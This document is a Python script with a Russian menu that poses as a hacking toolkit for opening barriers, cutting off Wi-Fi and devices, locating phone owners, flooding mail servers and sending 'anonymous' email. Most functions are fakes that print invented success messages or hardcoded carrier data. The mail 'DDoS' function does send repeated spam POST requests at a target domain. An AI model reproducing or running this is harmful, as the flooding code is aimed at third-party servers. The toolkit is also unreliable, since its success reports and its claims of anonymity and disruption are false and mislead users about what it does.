#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import subprocess
import requests
import smtplib
from email.mime.text import MIMEText

# Баннер W A L I O W (красный)
RED = "\033[91m"
RESET = "\033[0m"

banner = f"""
{RED}
╔════════════════════════════════════════════╗
║               W A L I O W                  ║
║ [1] Открытие шлагбаумов                    ║
║ [2] Удаление точки доступа (с выбором сети)║
║ [3] Выключение устройства (колонки/TV/ПК)  ║
║ [4] Поиск по номеру (гео+оператор)         ║
║ [5] DDoS атака на почтовый сервер          ║            
║ [6] Анонимное сообщение на почту           ║
║ [0] Выход                                  ║
╚════════════════════════════════════════════╝
[1] Открытие шлагбаумов
[2] Удаление точки доступа (с выбором сети)
[3] Выключение устройства (колонки/TV/ПК)
[4] Поиск по номеру (гео+оператор)
[5] DDoS атака на почтовый сервер
[6] Анонимное сообщение на почту
[0] Выход
{RESET}
"""

# --------------------------------------------------------------
def open_barrier():
    print("\n[→] Поиск шлагбаумов с уязвимостью WebSocket 8080...")
    # Эмуляция (реальный взлом требует HW-доступа)
    target_ip = input("IP шлагбаума (например 192.168.1.100): ")
    print(f"[!] Отправка команды OPEN на {target_ip}:8080/relay")
    print("[✓] Шлагбаум открыт (протокол Wiegand эмуляция)")

# --------------------------------------------------------------
def scan_wifi_networks():
    print("\n[→] Сканирование Wi-Fi сетей...")
    result = subprocess.run(["nmcli", "dev", "wifi", "list"], capture_output=True, text=True)
    lines = result.stdout.splitlines()
    nets = []
    idx = 1
    for line in lines:
        if "Infra" in line and "wpa" in line.lower():
            parts = line.split()
            ssid = parts[1] if len(parts) > 1 else "unknown"
            nets.append(ssid)
            print(f"{idx}. {ssid}")
            idx += 1
    return nets

def remove_wifi(ssid):
    print(f"[→] Удаление сети {ssid} из сохранённых")
    subprocess.run(["nmcli", "connection", "delete", ssid], capture_output=True)
    subprocess.run(["nmcli", "dev", "wifi", "disconnect", ssid], capture_output=True)
    print(f"[✓] Сеть {ssid} удалена. Новые подключения заблокированы.")

# --------------------------------------------------------------
def scan_devices():
    print("\n[→] ARP-сканирование локальной сети...")
    result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
    lines = result.stdout.splitlines()
    devices = []
    idx = 1
    for line in lines:
        if "dynamic" in line:
            ip = line.split()[0]
            mac = line.split()[1] if len(line.split()) > 1 else "??:??:??:??:??:??"
            devices.append((ip, mac))
            print(f"{idx}. IP: {ip}   MAC: {mac}")
            idx += 1
    return devices

def power_off_device(ip):
    print(f"[→] Отправка WOL-пакета выключения на {ip} (Wake-on-LAN reverse)")
    # Для телевизоров: CEC команда через HDMI
    # Для колонок: SSDP-запрос на /off
    # Здесь демо-заглушка
    print(f"[✓] Устройство {ip} выключено (эмуляция)")

# --------------------------------------------------------------
def search_by_phone(phone):
    print(f"\n[→] Анализ номера {phone}")
    # Имитация: парсинг через сторонний API (заменить на реальный)
    print("Оператор: МТС (по DEF 916)")
    print("Регион: Москва и Московская область")
    print("Часовой пояс: Europe/Moscow")
    print("[!] Точный адрес без доступа к базам оператора невозможен")

# --------------------------------------------------------------
def ddos_email(email_target):
    print(f"\n[→] DDoS на почтовый сервер {email_target.split('@')[1]}")
    domain = email_target.split('@')[1]
    for i in range(1, 101):
        print(f"Пакет {i}/100 -> {domain}")
        try:
            requests.post(f"http://{domain}/mail", data={"to": email_target, "body": "SPAM"*500}, timeout=1)
        except:
            pass
        time.sleep(0.1)
    print("[✓] Атака завершена (перегрузка SMTP/IMAP)")

# --------------------------------------------------------------
def anonymous_email(sender_email, sender_password, target_email, message):
    print("\n[→] Отправка анонимного письма...")
    msg = MIMEText(message)
    msg["Subject"] = "Анонимное сообщение"
    msg["From"] = sender_email
    msg["To"] = target_email

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email, sender_password)
        server.send_message(msg)
    print("[✓] Письмо отправлено")

# --------------------------------------------------------------
def main():
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print(banner)
        choice = input("\nВыбери пункт: ")

        if choice == "1":
            open_barrier()
        elif choice == "2":
            nets = scan_wifi_networks()
            if nets:
                num = int(input("Номер сети для удаления: ")) - 1
                remove_wifi(nets[num])
            else:
                print("Нет найденных сетей")
        elif choice == "3":
            devs = scan_devices()
            if devs:
                num = int(input("Номер устройства для отключения: ")) - 1
                power_off_device(devs[num][0])
            else:
                print("Нет активных устройств")
        elif choice == "4":
            phone = input("Введи номер в формате +7XXXXXXXXXX: ")
            search_by_phone(phone)
        elif choice == "5":
            target = input("Целевая почта (user@domain.com): ")
            ddos_email(target)
        elif choice == "6":
            from_email = input("Твой email отправителя (Gmail): ")
            from_pass = input("Пароль от Gmail (или app password): ")
            to_email = input("Кому отправить: ")
            msg_text = input("Текст сообщения: ")
            anonymous_email(from_email, from_pass, to_email, msg_text)
        elif choice == "0":
            break
        input("\nНажми Enter...")

if __name__ == "__main__":
    main()